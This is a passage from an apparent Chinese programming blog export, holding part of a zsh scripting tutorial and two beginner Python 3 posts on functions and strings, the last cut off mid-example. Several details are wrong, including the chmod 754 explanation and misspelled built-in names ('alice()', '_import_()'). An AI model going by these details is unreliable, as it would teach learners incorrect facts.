用于比较数值，里面可以调用各种数值相关的函数，变量前的 <code>$</code> 可省略。</h4><p>格式：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">if</span> <span class="token variable"><span class="token punctuation">((</span> <span class="token punctuation">))</span></span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>例子：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">if</span> <span class="token variable"><span class="token punctuation">((</span>num <span class="token operator">&gt;</span> <span class="token number">3</span> <span class="token operator">&amp;&amp;</span> num <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">))</span></span> <span class="token punctuation">{</span>    <span class="token builtin class-name">echo</span> <span class="token variable">$num</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="用于在当前-sehll-里运行-中的命令并判断运行结果"><a href="#用于在当前-sehll-里运行-中的命令并判断运行结果" class="headerlink" title="{ } 用于在当前 sehll 里运行 { } 中的命令并判断运行结果"></a><code>{ }</code> 用于在<strong>当前 sehll 里</strong>运行 <code>{ }</code> 中的命令并判断运行结果</h4><p>格式：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">if</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>例子：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">if</span> <span class="token punctuation">{</span>echo <span class="token string">'执行命令'</span><span class="token punctuation">}</span> <span class="token punctuation">{</span>    <span class="token builtin class-name">echo</span> <span class="token string">'执行成功'</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="用于在子-shell-里运行-中的命令并判断运行结果"><a href="#用于在子-shell-里运行-中的命令并判断运行结果" class="headerlink" title="( ) 用于在子 shell 里运行 ( ) 中的命令并判断运行结果"></a><code>( )</code> 用于在<strong>子 shell 里</strong>运行 <code>( )</code> 中的命令并判断运行结果</h4><p>格式：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function-name function">if</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>用法和 <code>{ }</code> 类似。</p><h4 id="混合条件"><a href="#混合条件" class="headerlink" title="混合条件"></a>混合条件</h4><p>以上几种括号可以一起使用，这样可以同时判断字符串、数值、文件、命令结果等。</p><p>但是建议不要混合使用 <code>&amp;&amp;</code> 和 <code>||</code>，会导致可读性变差且容易出错。</p><p>格式：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable"><span class="token punctuation">((</span> <span class="token punctuation">))</span></span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>### 循环语句<p>刚刚已经介绍完条件语句了，所以我就默认大家都大概了解各种括号的使用方法了，循环语句中的括号用法和 <code>if</code> 一样，示例中的 <code>[[ ]]</code> 可以替换成其他几种括号，功能也是一样的，不再依次举例了，大家可以自己试试。</p><h4 id="while-循环"><a href="#while-循环" class="headerlink" title="while 循环"></a>while 循环</h4><p>格式：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">while</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>    break/continue<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>这里的 <code>break</code> 用于结束循环，<code>continue</code> 用于直接进入下一次循环。所有的循环语句中都可以使用 <code>break</code> 和 <code>continue</code>。</p></blockquote><p>死循环：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">while</span> <span class="token variable"><span class="token punctuation">((</span><span class="token number">1</span><span class="token punctuation">))</span></span> <span class="token punctuation">{</span>    <span class="token builtin class-name">echo</span> good<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>#### until 循环<p><code>until</code> 和 <code>while</code> 相反，不满足条件时运行，一旦满足则停止运行，其他的用法和 <code>while</code> 相同，不再举例。</p><p>格式：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">until</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>#### for 循环<blockquote><p>格式 1：</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">for</span> <span class="token function-name function">i</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>for</code> 循环主要用于枚举，这里的括号是 <code>for</code> 的特有用法，不是在子 shell 执行。括号内是字符串（可放多个，空格隔开）、数组（可放多个）或者哈希表（可放多个，哈希表是枚举值而不是键）。<code>i</code> 是用于枚举内容的变量名，变量名随意取。</p><p>例 1：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">for</span> i <span class="token punctuation">(</span>aa bb cc<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token builtin class-name">echo</span> <span class="token variable">$i</span><span class="token punctuation">}</span><span class="token comment"># 执行后会输出如下内容</span><span class="token comment"># aa</span><span class="token comment"># bb</span><span class="token comment"># cc</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>例 2：枚举当前目录的 txt 文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">for i (*.txt) {    echo $i}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>例 3：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">arr</span><span class="token operator">=</span><span class="token punctuation">(</span>aa bb cc<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token builtin class-name">echo</span> <span class="token variable">$i</span><span class="token punctuation">}</span><span class="token comment"># 执行后会输出如下内容</span><span class="token comment"># aa</span><span class="token comment"># bb</span><span class="token comment"># cc</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>格式 2：</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">for</span> <span class="token variable"><span class="token punctuation">((</span> <span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token punctuation">))</span></span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这个感觉很熟悉啊，哈哈哈哈</p><p>例子：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">for</span> <span class="token variable"><span class="token punctuation">((</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">))</span></span> <span class="token punctuation">{</span>    <span class="token builtin class-name">echo</span> <span class="token variable">$i</span><span class="token punctuation">}</span><span class="token comment"># 执行后会依次输出 0~9</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>但是实际上多数情况不需要使用这种 <code>for</code> 循环，可以使用下面的方法。</p><blockquote><p>格式 3：</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">for</span> i <span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">..</span><span class="token number">10</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token builtin class-name">echo</span> <span class="token variable">$i</span><span class="token punctuation">}</span><span class="token comment"># 执行后会依次输出 1~10</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>{1..10}</code> 可以生成一个 1 到 10 的数组</p><br>#### repeat 循环<p><code>repeat</code> 语句用于循环固定次数，<code>n</code> 是一个证书或者内容为整数的变量。</p><p>格式：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">repeat n <span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>例子：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">repeat <span class="token number">5</span> <span class="token punctuation">{</span>    <span class="token builtin class-name">echo</span> good<span class="token punctuation">}</span><span class="token comment"># 执行后会输出五行「good」</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>### 分支语句<p>分支语句用 <code>if</code> 也可以实现，但 <code>case</code> 更适合这种场景，并且功能更强大。</p><p>格式 + 例子：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">i</span><span class="token operator">=</span>a<span class="token comment">#i=b</span><span class="token comment">#i=c</span><span class="token comment">#i=d</span><span class="token comment">#i=e</span><span class="token keyword">case</span> <span class="token variable">$i</span> <span class="token punctuation">{</span>    <span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token builtin class-name">echo</span> <span class="token number">1</span>    <span class="token punctuation">;</span><span class="token punctuation">;</span>    <span class="token punctuation">(</span>b<span class="token punctuation">)</span>    <span class="token builtin class-name">echo</span> <span class="token number">2</span>    <span class="token comment"># 继续执行下一个</span>    <span class="token punctuation">;</span><span class="token operator">&amp;</span>    <span class="token punctuation">(</span>c<span class="token punctuation">)</span>    <span class="token builtin class-name">echo</span> <span class="token number">3</span>    <span class="token comment"># 继续向下匹配</span>    <span class="token punctuation">;</span><span class="token operator">|</span>    <span class="token punctuation">(</span>c<span class="token punctuation">)</span>    <span class="token builtin class-name">echo</span> <span class="token number">33</span>    <span class="token punctuation">;</span><span class="token punctuation">;</span>    <span class="token punctuation">(</span>d<span class="token punctuation">)</span>    <span class="token builtin class-name">echo</span> <span class="token number">4</span>    <span class="token punctuation">;</span><span class="token punctuation">;</span>    <span class="token punctuation">(</span>*<span class="token punctuation">)</span>    <span class="token builtin class-name">echo</span> other    <span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中：</p><ul><li><code>;;</code> 代表结束 <code>case</code> 语句</li><li><code>;&amp;</code> 代表继续执行紧接着的下一个匹配语句（不再进行匹配）</li><li><code>;|</code> 代表继续往下匹配，看是否还有满足条件的分支。</li></ul><p>大家可以在上面的例子前尝试给 <code>i</code> 赋值不同的字符，看看效果，感觉比 java  简洁了好多啊！！！</p><br>#### 用户输入选择语句<p><code>select</code> 语句是用于根据用户的选择决定分支的语句，语法和 <code>for</code> 语句差不多，如果不 <code>break</code>，会循环让用户选择。</p><p>格式：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">select</span> <span class="token function-name function">i</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>例子：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">select</span> i <span class="token punctuation">(</span>aa bb cc<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token builtin class-name">echo</span> <span class="token variable">$i</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>执行完上面的例子后是这样的：</p><p><img src="http://wx1.sinaimg.cn/mw690/a6e9cb00ly1flx2iu5em5j20ew030wf9.jpg" alt="用户选择语句"></p><br>#### 异常处理语句<p>格式：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">{</span>    语句 <span class="token number">1</span><span class="token punctuation">}</span> always <span class="token punctuation">{</span>    语句 <span class="token number">2</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果语句 1 执行出错，则执行语句 2。</p><br>#### 简化的条件语句<p>格式：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在只有一个分支的情况下，可以使用简化的 <code>if</code> 语句，功能和 <code>if</code> 语句类似。就不举例啦！</p><blockquote><p>再次强调，强烈建议不要连续混合使用 <code>&amp;&amp;</code> 和 <code>||</code>，例如：</p>   <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aa <span class="token operator">&amp;&amp;</span> bb <span class="token operator">||</span> cc <span class="token operator">&amp;&amp;</span> <span class="token function">dd</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>容易导致逻辑错误或者误解，可以使用 <code>{ }</code> 把语句包含起来。</p>   <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aa <span class="token operator">&amp;&amp;</span> <span class="token punctuation">{</span> bb <span class="token operator">||</span> <span class="token punctuation">{</span> cc <span class="token operator">&amp;&amp;</span> <span class="token function">dd</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>比较复杂的判断还是使用 <code>if</code> 可读性更好，<code>&amp;&amp;</code> 和 <code>||</code> 通常只适用于简单的场景。</p></blockquote><br>## 一些常用命令<p>先说下命令如何使用吧</p><ul><li>符号 <code>-</code> 后面是命令选项，多个可以连写，只需要一个 <code>-</code> 即可。<br>  例如下面表格中的 <code>ls -al</code> 命令，<code>-a</code> 表示显示隐藏文件，<code>-l</code> 表示格式化目录列表，同时使用则为 <code>-al</code>。</li><li>命令后面用空格隔开的、没有 <code>-</code> 号的内容为命令的参数</li><li>多个参数之间用空格隔开，并且参数有顺序</li></ul><p>|命令|作用|<br>|:-|:-:|:-|:-:|<br>|ls|查看当前目录内容|<br>|pwd|显示当前目录|<br>|ls -a|查看当前目录所有内容|<br>|ls -al|显示并格式化当前目录所有内容|<br>|rm file|删除文件|<br>|rm -r dir|删除目录|<br>|rm -f|强制删除文件|<br>|rm -rf dir|强制删除目录|<br>|mkdir dir|创建目录|<br>|cp file1 file2|复制 file1 到 file2|<br>|mv file1 file2|移动或重命名 file1 为 file2|<br>|cd dir|改变当前目录为 dir|<br>|cd ..|返回上一级目录|<br>|tr -d str &lt;file1&gt; file2|删除 file1 文件中所有的 str 并保存为 file2 文件|</p><br>### chmod 权限命令<p>这个命令略微复杂，详细说一下吧</p><p>格式：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> 八进制数 需要授权的文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中，八进制数代表以下三个权限对应的数值之和：</p><ul><li>4 - 读权限(r)</li><li>2 - 写权限(w)</li><li>1 - 执行权限(x)</li></ul><p>并且，这个八进制数有三位，按顺序分别对应三种用户的权限：</p><p>拥有者/group/world</p><p>例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 为 test.txt 文件授予所有用户 rwx 权限（读、写和执行）</span><span class="token function">chmod</span> <span class="token number">777</span> test.txt<span class="token comment"># 为 test.txt 文件授予拥有者 rw 权限，授予 group 用户 rx 权限，授予 world 用户 w 权限</span><span class="token function">chmod</span> <span class="token number">754</span> test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>嗯…暂时用到过的大概就这些，在遇到的之后再补充吧~<br>感谢阅读，有问题可以在下面留言哟~</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> zsh </tag>
            
            <tag> bash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python 3 的函数</title>
      <link href="/2017/11/18/python3function/"/>
      <url>/2017/11/18/python3function/</url>
      
        <content type="html"><![CDATA[<p>字符串是什么？</p><p>其实经过上一篇博客的阅读与训练，你已经掌握了函数的用法：</p><div style="text-align:center;font-size:20px;color:#d63e63">print 是一个放入对象就能将结果打印的函数</div><div style="text-align:center;font-size:20px;color:#d63e63">input 是一个可以让用户输入信息的函数</div><div style="text-align:center;font-size:20px;color:#d63e63">len 是一个可以测量对象长度的函数</div><div style="text-align:center;font-size:20px;color:#d63e63">int 是一个可以将字符串类型的数字转换成整数类型的函数</div><p>通过观察规律，其实不难发现，Python 中所谓的使用函数就是把你要处理的对象放到一个名字后面的括号里就可以了。简单的来说，函数就是这么使用，往里面塞东西就能得到处理结果。</p><span id="more"></span><h2 id="内建函数-Built-in-Functions"><a href="#内建函数-Built-in-Functions" class="headerlink" title="内建函数 (Built-in Functions)"></a>内建函数 (Built-in Functions)</h2><p>以 Python 3.50 版本为例，一共存在 68 个内建函数（Built-in Function）。之所以被称之为内建函数，并不是因为还有「外建函数」这个概念，内建的意思是这些函数在 3.50 版本安装完成后你就可以使用它们，是「自带」的而已。</p><table><thead><tr><th align="center"></th><th align="center"></th><th align="center"></th><th align="center"></th><th align="center"></th></tr></thead><tbody><tr><td align="center">abs()</td><td align="center">dict()</td><td align="center">help()</td><td align="center">min()</td><td align="center">setattr()</td></tr><tr><td align="center">all()</td><td align="center">dir()</td><td align="center">hex()</td><td align="center">next()</td><td align="center">alice()</td></tr><tr><td align="center">any()</td><td align="center">divmod()</td><td align="center">id()</td><td align="center">object()</td><td align="center">sorted()</td></tr><tr><td align="center">ascii()</td><td align="center">enumerate()</td><td align="center">input()</td><td align="center">oct()</td><td align="center">staticmethod()</td></tr><tr><td align="center">bin()</td><td align="center">eval()</td><td align="center">int()</td><td align="center">open()</td><td align="center">str()</td></tr><tr><td align="center">bool()</td><td align="center">exec()</td><td align="center">isinstance()</td><td align="center">ord()</td><td align="center">sum()</td></tr><tr><td align="center">bytearray()</td><td align="center">filter()</td><td align="center">issubclass()</td><td align="center">pow()</td><td align="center">super()</td></tr><tr><td align="center">bytes()</td><td align="center">float()</td><td align="center">iter()</td><td align="center">print()</td><td align="center">tuple()</td></tr><tr><td align="center">callable()</td><td align="center">format()</td><td align="center">len()</td><td align="center">property()</td><td align="center">type()</td></tr><tr><td align="center">chr()</td><td align="center">frozenset()</td><td align="center">list()</td><td align="center">range()</td><td align="center">vars()</td></tr><tr><td align="center">classmethod()</td><td align="center">getattr()</td><td align="center">locals()</td><td align="center">repr()</td><td align="center">zip()</td></tr><tr><td align="center">compile()</td><td align="center">globals()</td><td align="center">map()</td><td align="center">reversed()</td><td align="center">_import_()</td></tr><tr><td align="center">complex()</td><td align="center">hasattr()</td><td align="center">max()</td><td align="center">round()</td><td align="center"></td></tr><tr><td align="center">delattr()</td><td align="center">hash()</td><td align="center">memoryview()</td><td align="center">set()</td><td align="center"></td></tr></tbody></table><blockquote><p>现在并不用着急把这些函数是怎么用的都搞明白，其中一些内建函数很实用，但是另外一些就不常用，比如涉及字符编码的函数 ascii(), bin(), chr() 等等，这些都是相对底层的编程设计中才会使用到的函数，在你深入到一定程度的时候才会派的上永昌。</p></blockquote><br><h2 id="开始创建函数"><a href="#开始创建函数" class="headerlink" title="开始创建函数"></a>开始创建函数</h2><p>我们需要学会使用已有的函数，更需要学会创建新的函数。自带的函数数量是有限的，想要让 Python 帮助我们做更多的事情，就要自己设计符合使用需求的函数。创建函数也很简单，其实我们在多年前的初中课上早已掌握了其原理。</p><p>先试着在命令行/终端中进入 Python 环境，输入这样的公式：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token number">1</span><span class="token operator">/</span><span class="token number">2</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">5</span><span class="token number">17.5</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token number">32</span><span class="token operator">*</span><span class="token number">9</span><span class="token operator">/</span><span class="token number">5</span><span class="token operator">+</span><span class="token number">32</span><span class="token number">89.6</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>看着眼熟不？第一个是数学梯形计算公式，而第二个是物理的摄氏度与华氏度的转换公式。</p><p>函数式编程中最基本的魔法，但同时一切的复杂又被隐含其中。它的原理和我们学习的数学公式相似，但是并不完全一样。</p><p><strong>这里先介绍几个常见的词：</strong></p><ul><li>def (即 define, 定义) 的含义是创建函数，也就是定义一个函数。</li><li>arg (即 argument, 参数) 有时你还能见到这种写法：parameter，二者都是参数的意思，但是稍有不同。</li><li>return 即返回结果。</li></ul><p>下面我们来定义一个函数：</p><p>Define a function named ‘function’ which has two arguments : arg1 and arg2, returns the result —— ‘Something’</p><p>是不是很易读很顺畅？哈哈，翻译成代码的话比英文句子更简洁一点：</p><p><img src="http://wx3.sinaimg.cn/mw690/a6e9cb00gy1flvpcdd9xpj20s00d4tao.jpg" alt="Python3 定义函数"></p><p><strong>注意</strong></p><ul><li>def 和 return 是关键字（keyword），Python 就是靠识别这些特定的关键字来明白用户的意图，实现更为复杂的编程。</li><li>在闭合括号后面的冒号必不可少，而且必须是英文输入法，否则就是错误的语法。</li><li>如果在 IDE 中冒号后面回车（换行）你会自动的得到一个缩进。函数缩进后面的语句被称作是语句块（block），缩进是为了表明语句和逻辑的从属关系，是 Python 最显著的特征之一。</li></ul><blockquote><p>缩进问题刚开始很容易忽视，导致代码无法成功运行，比如我。。。。</p></blockquote><p>现在我们试着把之前提到的摄氏度转化公式定义为 Python 函数：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">fahrenheit_Converter</span><span class="token punctuation">(</span>C<span class="token punctuation">)</span><span class="token punctuation">:</span>    fahrenheit <span class="token operator">=</span> C <span class="token operator">*</span> <span class="token number">9</span><span class="token operator">/</span><span class="token number">5</span> <span class="token operator">+</span> <span class="token number">32</span>    <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>fahrenheit<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'°F'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>我们把摄氏度定义为函数 fahrenheit_Converter(),那么输入进去的必然是摄氏度（Celsius）数值，我们把 C 设为参数，最后返回的是华氏度（fahrenheit）数值。</p><blockquote><p>注意：计算的结果类型是 int，不能与字符串「°F」相合并，所以需要先使用 str() 函数进行转换。</p></blockquote><p>定义完了函数，我们再来使用它：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">C2F <span class="token operator">=</span> fahrenheit_Converter<span class="token punctuation">(</span><span class="token number">35</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>C2F<span class="token punctuation">)</span><span class="token comment">#输出结果</span><span class="token number">95</span>°F<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>我们把使用函数这种行为叫做「调用」(call)，你可以简单的理解成你请求 Python 给你帮忙去做一件事情，就像上一篇文章学到的 len() 一样：「请帮我测量这个对象的长度，并将结果打印出来。」</p><p>到此为止，Python 中函数的定义和基本用法我们就已经了解了。</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python 3 的字符串</title>
      <link href="/2017/11/12/python3string/"/>
      <url>/2017/11/12/python3string/</url>
      
        <content type="html"><![CDATA[<p>字符串是什么？</p><p>在上一篇博客我们已经初步了解到了字符串，简单地说，字符串就是……</p><div style="text-align:center;font-size:20px;color:#d63e63">"<font color="e89648">任何在这双引号之间的文字</font>"</div><div style="text-align:center">或者</div><div style="text-align:center;font-size:20px;color:#d63e63">'<font color="e89648">单引号其实和双引号完全一样</font>'</div><div style="text-align:center">再或者</div><div style="text-align:center;font-size:20px;color:#d63e63">'''<font color="e89648">三个引号被用于过长段的文<br>字或者是说明，只要三引号不完<br>你就可以随意换行写下文字</font>'''</div><p>这一篇呢，咱详细的讲讲 Python 3 的字符串用法~略微详细的…哈哈哈</p><span id="more"></span><h2 id="字符串的基本用法"><a href="#字符串的基本用法" class="headerlink" title="字符串的基本用法"></a>字符串的基本用法</h2><h3 id="合并"><a href="#合并" class="headerlink" title="合并"></a>合并</h3><p>运行下面的代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">what_he_does <span class="token operator">=</span> <span class="token string">' plays '</span>his_instrument <span class="token operator">=</span> <span class="token string">'guitar'</span>his_name <span class="token operator">=</span> <span class="token string">'Robert Johnson'</span>artist_intro <span class="token operator">=</span> his_name <span class="token operator">+</span> what_he_does <span class="token operator">+</span> his_instrument<span class="token keyword">print</span> <span class="token punctuation">(</span>artist_intro<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>会输出</p><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini">Robert Johnson plays guitar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>感觉好无聊啊，不过这都是基础，以后加上界面一定就好看了^_^</p><h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><p>Python 中不同的数据类型是不能够进行合并的，但是可以通过一些方法进行转换</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">num <span class="token operator">=</span> <span class="token number">1</span>string <span class="token operator">=</span> <span class="token string">'1'</span>num2 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token comment"># 字符串转换成数字</span><span class="token keyword">print</span> <span class="token punctuation">(</span>num <span class="token operator">+</span> num<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>如果你不知道变量是什么类型，可以通过 <code>type()</code> 函数来查看类型。在编辑器中输入 <code>print (type(xxx))</code> 即可查看 xxx 的数据类型。</p><p>另外，由于中文注释也会导致报错，所以需要在文件开头加一行魔法注释 <code>#coding:utf-8</code></p></blockquote><h3 id="字符串相乘"><a href="#字符串相乘" class="headerlink" title="字符串相乘"></a>字符串相乘</h3><p>既然字符串可以相加，那么字符串之间能不能相乘呢？当然可以！</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">words <span class="token operator">=</span> <span class="token string">'words'</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token keyword">print</span> <span class="token punctuation">(</span>words<span class="token punctuation">)</span><span class="token comment"># 输出结果</span>wordswordswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>怎么样，有意思吧？咱再试试更复杂的！</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">word <span class="token operator">=</span> <span class="token string">'a looooong word'</span>num <span class="token operator">=</span> <span class="token number">12</span>string <span class="token operator">=</span> <span class="token string">'bang!'</span>total <span class="token operator">=</span> string <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span> <span class="token operator">-</span> num<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>total<span class="token punctuation">)</span><span class="token comment"># 输出结果</span>bang!bang!bang!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Bang! 恭喜你，掌握了字符串最基本的用法了！</p><h2 id="字符串的分片与索引"><a href="#字符串的分片与索引" class="headerlink" title="字符串的分片与索引"></a>字符串的分片与索引</h2><p>字符串可以通过 <code>string[x]</code> 的方式进行索引、分片。实际上就是从字符串中找出你要截取的东西，复制出来一小段你要的长度，储存在另一个地方，而不会对原字符串改动。分片获得的每个字符串可以看做是原字符串的一个副本。</p><p>类似 Java 中的 <code>substring()</code>，但又有些不同：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">name <span class="token operator">=</span> <span class="token string">'My name is Bozi'</span><span class="token keyword">print</span> <span class="token punctuation">(</span>name<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 第 0 